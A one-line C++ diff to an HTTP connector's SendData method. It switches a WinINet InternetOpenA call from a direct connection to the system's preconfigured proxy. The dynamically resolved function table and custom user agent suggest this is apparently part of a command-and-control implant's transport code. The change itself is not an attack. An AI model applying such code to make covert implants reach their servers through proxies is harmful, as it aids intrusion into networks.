@@ -134,7 +134,7 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 		DWORD dwError = 0;
 
 		if (!this->hInternet)
-			this->hInternet = this->functions->InternetOpenA( this->user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0 );
+			this->hInternet = this->functions->InternetOpenA( this->user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
 		if ( this->hInternet ) {
 
 			if ( !this->hConnect )
